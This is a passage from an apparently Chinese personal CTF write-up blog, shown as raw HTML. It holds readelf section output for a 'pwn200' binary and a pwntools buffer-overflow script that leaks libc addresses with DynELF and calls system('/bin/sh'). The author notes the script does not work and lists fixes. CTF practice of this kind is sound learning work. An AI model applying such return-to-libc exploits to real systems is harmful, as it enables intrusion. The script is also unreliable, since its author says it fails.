</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>8</span><span class=p>]</span> <span class=p>.</span><span class=n>gnu</span><span class=p>.</span><span class=n>version_r</span>    <span class=n>VERNEED</span>         <span class=mf>080482e0</span> <span class=mf>0002e0</span> <span class=mo>000020</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>6</span>   <span class=mi>1</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span> <span class=mi>9</span><span class=p>]</span> <span class=p>.</span><span class=n>rel</span><span class=p>.</span><span class=n>dyn</span>          <span class=n>REL</span>             <span class=mi>08048300</span> <span class=mo>000300</span> <span class=mo>00001</span><span class=mi>8</span> <span class=mi>08</span>   <span class=n>A</span>  <span class=mi>5</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=p>.</span><span class=n>rel</span><span class=p>.</span><span class=n>plt</span>          <span class=n>REL</span>             <span class=mi>08048318</span> <span class=mo>00031</span><span class=mi>8</span> <span class=mo>00002</span><span class=mi>8</span> <span class=mi>08</span>   <span class=n>A</span>  <span class=mi>5</span>  <span class=mi>12</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=p>.</span><span class=n>init</span>             <span class=n>PROGBITS</span>        <span class=mi>08048340</span> <span class=mo>000340</span> <span class=mo>00002</span><span class=n>e</span> <span class=mo>00</span>  <span class=n>AX</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>12</span><span class=p>]</span> <span class=p>.</span><span class=n>plt</span>              <span class=n>PROGBITS</span>        <span class=mi>08048370</span> <span class=mo>000370</span> <span class=mo>000060</span> <span class=mo>04</span>  <span class=n>AX</span>  <span class=mi>0</span>   <span class=mi>0</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>13</span><span class=p>]</span> <span class=p>.</span><span class=n>text</span>             <span class=n>PROGBITS</span>        <span class=mi>080483</span><span class=n>d0</span> <span class=mo>0003</span><span class=n>d0</span> <span class=mo>00024</span><span class=n>c</span> <span class=mo>00</span>  <span class=n>AX</span>  <span class=mi>0</span>   <span class=mi>0</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>14</span><span class=p>]</span> <span class=p>.</span><span class=n>fini</span>             <span class=n>PROGBITS</span>        <span class=mi>0804861</span><span class=n>c</span> <span class=mo>00061</span><span class=n>c</span> <span class=mo>00001</span><span class=n>a</span> <span class=mo>00</span>  <span class=n>AX</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>15</span><span class=p>]</span> <span class=p>.</span><span class=n>rodata</span>           <span class=n>PROGBITS</span>        <span class=mi>08048638</span> <span class=mo>00063</span><span class=mi>8</span> <span class=mo>00000</span><span class=mi>8</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=p>.</span><span class=n>eh_frame_hdr</span>     <span class=n>PROGBITS</span>        <span class=mi>08048640</span> <span class=mo>000640</span> <span class=mo>00003</span><span class=n>c</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>17</span><span class=p>]</span> <span class=p>.</span><span class=n>eh_frame</span>         <span class=n>PROGBITS</span>        <span class=mi>0804867</span><span class=n>c</span> <span class=mo>00067</span><span class=n>c</span> <span class=mo>0000</span><span class=n>ec</span> <span class=mo>00</span>   <span class=n>A</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>18</span><span class=p>]</span> <span class=p>.</span><span class=n>ctors</span>            <span class=n>PROGBITS</span>        <span class=mf>08049f</span><span class=mi>14</span> <span class=mf>000f</span><span class=mi>14</span> <span class=mo>00000</span><span class=mi>8</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>19</span><span class=p>]</span> <span class=p>.</span><span class=n>dtors</span>            <span class=n>PROGBITS</span>        <span class=mf>08049f</span><span class=mi>1</span><span class=n>c</span> <span class=mf>000f</span><span class=mi>1</span><span class=n>c</span> <span class=mo>00000</span><span class=mi>8</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>20</span><span class=p>]</span> <span class=p>.</span><span class=n>jcr</span>              <span class=n>PROGBITS</span>        <span class=mf>08049f</span><span class=mi>24</span> <span class=mf>000f</span><span class=mi>24</span> <span class=mo>000004</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>21</span><span class=p>]</span> <span class=p>.</span><span class=n>dynamic</span>          <span class=n>DYNAMIC</span>         <span class=mf>08049f</span><span class=mi>28</span> <span class=mf>000f</span><span class=mi>28</span> <span class=mo>0000</span><span class=n>c8</span> <span class=mi>08</span>  <span class=n>WA</span>  <span class=mi>6</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>22</span><span class=p>]</span> <span class=p>.</span><span class=n>got</span>              <span class=n>PROGBITS</span>        <span class=mf>08049ff</span><span class=mi>0</span> <span class=mf>000ff</span><span class=mi>0</span> <span class=mo>000004</span> <span class=mo>04</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>23</span><span class=p>]</span> <span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=n>plt</span>          <span class=n>PROGBITS</span>        <span class=mf>08049ff</span><span class=mi>4</span> <span class=mf>000ff</span><span class=mi>4</span> <span class=mo>000020</span> <span class=mo>04</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>24</span><span class=p>]</span> <span class=p>.</span><span class=n>data</span>             <span class=n>PROGBITS</span>        <span class=mi>0804</span><span class=n>a014</span> <span class=mo>001014</span> <span class=mo>00000</span><span class=mi>8</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>4</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>25</span><span class=p>]</span> <span class=p>.</span><span class=n>bss</span>              <span class=n>NOBITS</span>          <span class=mi>0804</span><span class=n>a020</span> <span class=mo>00101</span><span class=n>c</span> <span class=mo>00002</span><span class=n>c</span> <span class=mo>00</span>  <span class=n>WA</span>  <span class=mi>0</span>   <span class=mi>0</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>26</span><span class=p>]</span> <span class=p>.</span><span class=n>comment</span>          <span class=n>PROGBITS</span>        <span class=mo>00000000</span> <span class=mo>00101</span><span class=n>c</span> <span class=mo>00002</span><span class=n>a</span> <span class=mo>01</span>  <span class=n>MS</span>  <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>1</span>
</span></span><span class=line><span class=cl>  <span class=p>[</span><span class=mi>27</span><span class=p>]</span> <span class=p>.</span><span class=n>shstrtab</span>         <span class=n>STRTAB</span>          <span class=mo>00000000</span> <span class=mo>001046</span> <span class=mo>0000</span><span class=n>ec</span> <span class=mo>00</span>      <span class=mi>0</span>   <span class=mi>0</span>  <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>Key</span> <span class=n>to</span> <span class=nl>Flags</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=nf>W</span> <span class=p>(</span><span class=n>write</span><span class=p>),</span> <span class=nf>A</span> <span class=p>(</span><span class=n>alloc</span><span class=p>),</span> <span class=nf>X</span> <span class=p>(</span><span class=n>execute</span><span class=p>),</span> <span class=nf>M</span> <span class=p>(</span><span class=n>merge</span><span class=p>),</span> <span class=nf>S</span> <span class=p>(</span><span class=n>strings</span><span class=p>),</span> <span class=nf>I</span> <span class=p>(</span><span class=n>info</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>L</span> <span class=p>(</span><span class=n>link</span> <span class=n>order</span><span class=p>),</span> <span class=nf>O</span> <span class=p>(</span><span class=n>extra</span> <span class=n>OS</span> <span class=n>processing</span> <span class=n>required</span><span class=p>),</span> <span class=nf>G</span> <span class=p>(</span><span class=n>group</span><span class=p>),</span> <span class=nf>T</span> <span class=p>(</span><span class=n>TLS</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>C</span> <span class=p>(</span><span class=n>compressed</span><span class=p>),</span> <span class=nf>x</span> <span class=p>(</span><span class=n>unknown</span><span class=p>),</span> <span class=nf>o</span> <span class=p>(</span><span class=n>OS</span> <span class=n>specific</span><span class=p>),</span> <span class=nf>E</span> <span class=p>(</span><span class=n>exclude</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nf>p</span> <span class=p>(</span><span class=n>processor</span> <span class=n>specific</span><span class=p>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>from</span> <span class=n>pwn</span> <span class=n>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=err>&#39;</span><span class=n>terminator</span><span class=sc>&#39;,&#39;</span><span class=o>-</span><span class=n>x</span><span class=sc>&#39;,&#39;</span><span class=n>sh</span><span class=sc>&#39;,&#39;</span><span class=o>-</span><span class=n>c</span><span class=err>&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=nf>process</span><span class=p>(</span><span class=err>&#39;</span><span class=n>pwn200</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span><span class=o>=</span><span class=nf>ELF</span><span class=p>(</span><span class=err>&#39;</span><span class=n>pwn200</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>write_plt</span><span class=o>=</span><span class=n>elf</span><span class=p>.</span><span class=n>plt</span><span class=p>[</span><span class=err>&#39;</span><span class=n>write</span><span class=err>&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>vul_func</span><span class=o>=</span><span class=mh>0x8048484</span>
</span></span><span class=line><span class=cl><span class=n>bss_addr</span><span class=o>=</span><span class=mh>0x0804a020</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>def</span> <span class=nf>leak</span><span class=p>(</span><span class=n>address</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=o>=</span><span class=n>b</span><span class=sc>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x6c</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=n>write_plt</span><span class=p>)</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=n>vul_func</span><span class=p>)</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=n>address</span><span class=p>)</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=o>=</span><span class=n>payload</span><span class=p>.</span><span class=nf>ljust</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span><span class=n>b</span><span class=sc>&#39;b&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=p>.</span><span class=nf>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>=</span><span class=n>p</span><span class=p>.</span><span class=nf>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dyn</span><span class=o>=</span><span class=nf>DynELF</span><span class=p>(</span><span class=n>leak</span><span class=p>,</span><span class=n>elf</span><span class=o>=</span><span class=nf>ELF</span><span class=p>(</span><span class=err>&#39;</span><span class=n>pwn200</span><span class=err>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sys_addr</span><span class=o>=</span><span class=n>dyn</span><span class=p>.</span><span class=nf>lookup</span><span class=p>(</span><span class=err>&#39;</span><span class=n>system</span><span class=sc>&#39;,&#39;</span><span class=n>libc</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nf>print</span><span class=p>(</span><span class=n>sys_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>b</span><span class=sc>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x6c</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=n>sys_addr</span><span class=p>)</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=n>vul_func</span><span class=p>)</span><span class=o>+</span><span class=nf>p32</span><span class=p>(</span><span class=err>&#39;</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span><span class=err>\</span><span class=n>x00</span><span class=err>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>payload</span><span class=p>.</span><span class=nf>ljust</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span><span class=n>b</span><span class=sc>&#39;b&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>.</span><span class=nf>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>写的代码一点反应都没有，看看哪里错了吧</p><ul><li>利用read函数将/bin/sh写入bss_addr</li><li>read函数后需要接上pop pop pop ret来平衡堆栈</li></ul><h1 id=未果pwn1>未果pwn1</h1><h1 id=未果note-service2>未果note-service2</h1><h1 id=未果supermarket>未果supermarket</h1><p><a href=https://blog.csdn.net/qq_44370676/article/details/108229050>攻防世界supermarket_I still &mldr;的博客-CSDN博客</a></p><h1 id=参考资料>参考资料</h1>           </div>       </article>   </main><div class="disqus markdown"><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//vincebye.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/Vincebye/ target=_blank rel="noopener noreferrer me" title=Github><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://twitter.com/vincebye target=_blank rel="noopener noreferrer me" title=Twitter><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=mailto:0xvincebye@gmail.com target=_blank rel="noopener noreferrer me" title=Email><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 21" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></a><a href=index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2023 Vincebye.
Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel="noreferrer noopener">Hugo blog awesome</a>
theme on
<a href=https://gohugo.io target=_blank rel="noreferrer noopener">Hugo</a>.</small></footer><script src=https://vincebye.github.io/js/themeSwitchnMenu.min.2a402288242b6930b175a0722c267e2353055739b3975834df35e56d00dd8f50.js></script></body></html>